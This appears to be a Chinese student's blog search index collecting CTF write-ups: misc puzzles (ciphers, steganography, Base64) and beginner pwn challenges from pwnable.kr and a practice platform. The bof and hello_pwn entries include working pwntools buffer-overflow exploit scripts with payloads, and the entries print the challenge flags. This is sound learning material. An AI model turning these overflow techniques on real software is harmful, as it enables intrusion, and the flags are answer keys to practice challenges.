<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>misc</title>
      <link href="/2021/11/02/misc/"/>
      <url>/2021/11/02/misc/</url>
      
        <content type="html"><![CDATA[<p><strong>this_is_flag:</strong></p><p>flag就在题目描述中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;th1s_!s_a_d4m0_4la9&#125;</span><br></pre></td></tr></table></figure><p><strong>pdf：</strong></p><p>下载附件-&gt;<a href="https://smallpdf.com/cn/pdf-converter">PDF转换器 – 在线免费转换PDF文件 (smallpdf.com)</a>-&gt;转换为ppt格式下载再打开即可拖动，转换成word再下载也能看到字</p><p><img src="image-20211102134142425.png" alt="image-20211102134142425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;security_through_obscurity&#125;</span><br></pre></td></tr></table></figure><p><strong>如来十三掌：</strong></p><p>打开附件：</p><p><img src="image-20211102134230550.png" alt="image-20211102134230550"></p><p>复制文字，进入<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 (keyfc.net)</a></p><p>粘贴文字并在前加上佛曰：</p><p><img src="image-20211102134250167.png" alt="image-20211102134250167"></p><p>得到一串字符，复制，百度搜索rot-13解码，这里直接复制链接在此：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">ROT13解码计算器 - 计算专家 (jisuan.mobi)</a></p><p><img src="image-20211102134317437.png" alt="image-20211102134317437"></p><p>再将解码结果进行Base64解码，解码器链接：<a href="https://tool.ip138.com/base64/">base64解码 base64编码 在线base64解码/编码工具 (ip138.com)</a></p><p><img src="image-20211102134332825.png" alt="image-20211102134332825"></p><p>得到flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure><p><strong>give_you_flag</strong>：</p><p>这题要下载stegsolve，我不会下，也懒得摸索，暂时先copy别人的解法吧</p><p>下载下来之后，发现真的是个表情包，里面还闪现了一个二维码！</p><p>利用<strong>Stegsolve.jar</strong> 打开之后，<strong>Analyse-Frame Browser</strong>一帧一帧的看</p><p>在50个发现了残缺的二维码</p><p><img src="image-20211102135137641.png" alt="image-20211102135137641"></p><p>少了三个块块，想办法补上。PS可以补，但是涉及到我的知识盲区了,只好找朋友帮忙。</p><p>机缘就这么来了！</p><p>准备给同学截图的时候，忽然想起来qq截图还有画笔的功能！</p><p><img src="image-20211102135154257.png" alt="image-20211102135154257"></p><p>试了试，成功了哈哈哈</p><p>微信扫描就出结果了！</p><p>一点都看不出来哈哈哈哈</p><p>copy链接：<a href="https://zhuanlan.zhihu.com/p/127269755">最详细攻防世界MISC新手区（已完结）小白解法 - 知乎 (zhihu.com)</a></p><p>解法二：</p><p><a href="https://blog.csdn.net/qq_40481505/article/details/89425543">https://blog.csdn.net/qq_40481505/article/details/89425543</a></p><p><a href="https://blog.csdn.net/tqydyqt/article/details/101988854">https://blog.csdn.net/tqydyqt/article/details/101988854</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</span><br></pre></td></tr></table></figure><p><strong>stegano</strong>：</p><p>下载火狐浏览器及附件，用火狐浏览器打开文件</p><p><img src="image-20211102135248023.png" alt="image-20211102135248023"></p><p>F12打开控制台，输入<strong>document.documentElement.textContent</strong>得到以下结果：</p><p><img src="image-20211102135314037.png" alt="image-20211102135314037"></p><p><strong>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</strong></p><p>发现一大段AABABA样式的东西，猜测是01但是这些有分割，能想到的只有摩斯密码有分割的，于是尝试改成<strong>摩斯密码</strong></p><p>简单地写了一个转换器：</p><p><img src="image-20211102135403685.png" alt="image-20211102135403685"></p><p><img src="image-20211102135413534.png" alt="image-20211102135413534"></p><p><img src="image-20211102135424328.png" alt="image-20211102135424328"></p><p>百度上找一个摩斯码解码器得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure><p><strong>坚持60s</strong>：</p><p>下载并打开XJad(要压缩包的话联系我wx：xy1724252720)，反编译本题附件</p><p><img src="image-20211102135631579.png" alt="image-20211102135631579"></p><p>至这个目录打开文件，一个一个查找，发现flag在这里面</p><p><img src="image-20211102135646777.png" alt="image-20211102135646777"></p><p><img src="image-20211102135655848.png" alt="image-20211102135655848"></p><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p><p>看到flag，复制过去</p><p>提交不对，看见等号，想是不是<strong>base64</strong>，解码还真是！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure><p><strong>gif：</strong></p><p>下载附件，解压至桌面，打开解压出来的文件夹：</p><p><img src="image-20211102135741412.png" alt="image-20211102135741412"></p><p>想到01代码，以白为0，以黑为1，进行转换</p><p>0110011001101100011000010110011101111011010001100111010101001110010111110110011101101001010001100111110101111101</p><p>[在线二进制转换字符串<a href="http://www.txttool.com/t/?id=Mzky">EN] - 转换 (txttool.com)</a></p><p><img src="image-20211102135813253.png" alt="image-20211102135813253"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure><p><strong>掀桌子：</strong></p><p>题目中出现了一串神秘的字符串：</p><p>c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2</p><p>发现是数字与abcdef的组合，而我们熟知的16进制不就是由这些符号组成的吗？</p><p>接着我用以往解题的思路，拿去转换为二进制，再将二进制转字符，发现结果不对</p><p>最后通过查找别人的解法得知该题中得以两个16进制数为一组表示一个字符，但每两个二进制数的组合都大于128，而未扩展的ascll码值字符取值区间为0-128，所以要对每两个16进制数进行减128处理，再换为字符</p><p><img src="image-20211102174948168.png" alt="image-20211102174948168"></p><p>然后便有了以上脚本，运行如下：</p><p><img src="image-20211102175006281.png" alt="image-20211102175006281"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&#x27;</span></span><br><span class="line">kk = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>)</span><br><span class="line">b = re.findall(kk,a)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结合flag格式得出flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hjzcydjzbjdcjkzkcugisdchjyjsbdfr&#125;</span><br></pre></td></tr></table></figure><p>其中的re模块、findall（）函数等请自行百度查阅了解</p><p><a href="https://blog.csdn.net/qq_36556893/article/details/89182067">https://blog.csdn.net/qq_36556893/article/details/89182067</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>get_shell</title>
      <link href="/2021/10/28/get-shell/"/>
      <url>/2021/10/28/get-shell/</url>
      
        <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211028122944618.png" alt="image-20211028122944618"></p><p>下载附件&amp;获取场景：</p><p><img src="image-20211028122959729.png" alt="image-20211028122959729"></p><p>因为题目中说运行即可拿到shell，那我们就直接进虚拟机连接到该ip去看看</p><p>发现nc指令连不上去，之前用ssh也连不上，根本没反应,我姐说可能是防火墙的原因 </p><p><img src="image-20211028123019714.png" alt="image-20211028123019714"></p><p>那我们换个思路，写个脚本试试：</p><p><img src="image-20211028123056923.png" alt="image-20211028123056923"></p><p>运行该脚本：</p><p><img src="image-20211028123302612.png" alt="image-20211028123302612"></p><p>$ ls 查看当前目录文件，发现flag，cat一下  $ cat flag 发现能够得到flag，提交即可</p><p>flag：cyberpeace{c2414b5c0583aef5e2d7b2bbd7a98a83}</p><p><strong>拓展：</strong></p><p>但题目说运行即可拿到flag，我们并没有运行本题附件，接下来下载附件运行一下</p><p><img src="image-20211028123403958.png" alt="image-20211028123403958"></p><p>这是我/Desktop目录下的文件：</p><p><img src="image-20211028123422849.png" alt="image-20211028123422849"></p><p>显然，这个附件帮我拿到了我自己电脑的shell，所以我只能查看我自己电脑上的文件</p><p>这时我们打开ida反编译一下附件：</p><p>打开main函数后可以发现，这里直接调用了system（）函数获取shell</p><p><img src="image-20211028123450549.png" alt="image-20211028123450549"></p><p><strong>综述：</strong></p><p>本地执行本题附件只会拿到当前机器的shell，而该题的flag存在远端服务器上，并未存储在我们的个人PC上，所以我们要连接到远端服务器上，去服务器上执行该文件才能在服务器上拿到该题的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;63031&#x27;</span>)     <span class="comment">#远程连接</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收服务器的交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：cyberpeace&#123;c2414b5c0583aef5e2d7b2bbd7a98a83&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>flag</title>
      <link href="/2021/10/28/flag/"/>
      <url>/2021/10/28/flag/</url>
      
        <content type="html"><![CDATA[<p><strong>1：</strong>拿到题目，借助网址下载相应文件<strong>1：</strong>拿到题目，借助网址下载相应文件</p><p><img src="image-20211028121819871.png" alt="image-20211028121819871"></p><p><img src="image-20211028121841578.png" alt="image-20211028121841578"></p><p>命令1：wget <a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p><p><strong>2：</strong>通过网络资料知：</p><p>  “用个16进制查看器看一下,是elf文件,并且加了upx壳,要脱下upx壳才好分析”</p><p><img src="image-20211028121911536.png" alt="image-20211028121911536"></p><p>这16进制查看器我不知道咋弄的，该图也是从网上搬来的。</p><p><strong>3：</strong>由于upx不为自带文件，需自行下载，相应Linux指令附着于下：</p><p>（1）：下载upx：命令2：</p><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p><p>（2）：解压二进制：命令3：</p><p>tar -Jxf upx*.tar.xz</p><p>（3）：为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量：命令4：</p><p>sudo cp upx*/upx /usr/bin</p><p><strong>4：</strong>利用upx 进行解压，upx -d filename：</p><p><img src="image-20211028121940998.png" alt="image-20211028121940998"></p><p>基本操作不做过多赘述，实在不理解请自行百度查找（其实我也不理解，会用就行）</p><p>命令6：upx -d flag</p><p>5：查看文件是否下载至当前路径（我的当前路径为Desktop（桌面））：</p><p><img src="image-20211028122002870.png" alt="image-20211028122002870"></p><p>此处进行了权限赋予操作（赘余操作，可不必进行）</p><p>命令7：chmod 777 flag</p><p><strong>6：</strong>运用file命令查看flag文件的位数情况（32位 or 64位）：</p><p><img src="image-20211028122020834.png" alt="image-20211028122020834"></p><p>命令8：file flag</p><p>由此得知flag文件为64位文件</p><p><strong>7：</strong>现在只需将flag文件拖动至Windows界面中的64位ida中进行反编译即可，具体操作在此不做赘述（拖动文件会吧？不用教了吧，拖不出来的话考虑换一个虚拟机吧）</p><p><strong>8：</strong>接下来就是常规操作，按下ok，找到main函数按下F5，结果如下：</p><p><img src="image-20211028122043880.png" alt="image-20211028122043880"></p><p><strong>9：</strong>分析main函数，并无特别之处，但那flag格外显眼，经合情推理，flag内置于内存之中，这时我们只需双击flag便可进入如下界面，并发现flag地址处存储的一组字符串：</p><p><img src="image-20211028122118485.png" alt="image-20211028122118485"></p><p>UPX…? sounds like a delivery service但这并不是flag</p><p>10：双击字符串后进入另一界面，此时flag便出现了：</p><p><img src="image-20211028122203449.png" alt="image-20211028122203449"></p><p>正解flag：UPX…? sounds like a delivery service :)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bof</title>
      <link href="/2021/10/28/bof/"/>
      <url>/2021/10/28/bof/</url>
      
        <content type="html"><![CDATA[<p>1：先看题目</p><p><img src="clip_image002.jpg" alt="clip_image002"></p><p>Windows:将地址复制粘贴至浏览器即可下载</p><p>Linux：开启root权限，使用wget指令即可下载本题文件</p><p>  $ wget <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a></p><p>  $ wget <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p><p>2：Linux下使用file指令查看bof文件信息</p><p><img src="clip_image003.png" alt="clip_image003"></p><p>32-bit可知bof文件为32位文件</p><p>3：打开32位ida，将bof二进制可执行文件拖入其中</p><p>进行一些基本操作可得到如下结果，如图</p><p>图一：main函数</p><p>图二：func函数</p><p><img src="clip_image005.jpg" alt="clip_image005"></p><p><img src="clip_image006.png" alt="clip_image006"></p><p>简要分析可知：在远端服务器执行该文件，并且当a1的值为-889275714时，即可拿到远端服务器的shell，进而得到你想要的flag，to win</p><p>5：</p><p><img src="clip_image007.png" alt="clip_image007"></p><p>Gdb打开bof文件</p><p><img src="clip_image008.png" alt="clip_image008"></p><p>在main函数处设置断点并执行文件</p><p><img src="clip_image009.png" alt="clip_image009"></p><p><img src="clip_image011.jpg" alt="clip_image011"></p><p><img src="clip_image013.jpg" alt="clip_image013"></p><p>在idamain函数中使用Hex…我们发现这两个数据相同，自己领会</p><p><img src="clip_image014.png" alt="clip_image014"></p><p>刚运行至我们设置的断点处，指针停在了这个位置</p><p><img src="clip_image015.png" alt="clip_image015"></p><p>离我们的func函数仅有三步之遥</p><p><img src="clip_image016.png" alt="clip_image016"></p><p>此时我们执行四次si指令即可进入func函数，结果如下</p><p><img src="clip_image017.png" alt="clip_image017"></p><p>查看栈段：</p><p><img src="clip_image019.jpg" alt="clip_image019"></p><p>得到内存的栈段中func函数的末尾地址0xffffd130</p><p>利用x/50wx 0xffffd130，从栈地址0xffffd130向高位打印50个内存地址（一个地址四字节）</p><p><img src="clip_image021.jpg" alt="clip_image021"></p><p>结果如上图，第一个0x61616161便是我们输入的数组s的初始值（即s[0]），0xdeadbeef即为我们main函数中的传入func的参数，因此我们只需要输入80-4c = 34（转换为十进制即为52），输入52个任意字符外加目标字符“0xCAFEBABE”即可解决此题</p><p>构造的脚本如下：</p><p><img src="clip_image022.png" alt="clip_image022"></p><p>结果如下：</p><p><img src="clip_image023.png" alt="clip_image023"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)             <span class="comment">#连接远端服务器</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x34</span>) + p32(<span class="number">0xcafebabe</span>))  <span class="comment">#发送payload</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收远端服务器交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-hello_pwn</title>
      <link href="/2021/10/27/Note/"/>
      <url>/2021/10/27/Note/</url>
      
        <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p><p>下载附件，ida反编译并找出主函数：</p><p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p><p>看到read函数，初步判断是栈溢出题</p><p>进入sub函数查看：</p><p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p><p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p><p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p><p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p><p>对比一下：</p><p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p><p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p><p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p><p><img src="image-20211027224758038.png" alt="image-20211027224758038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
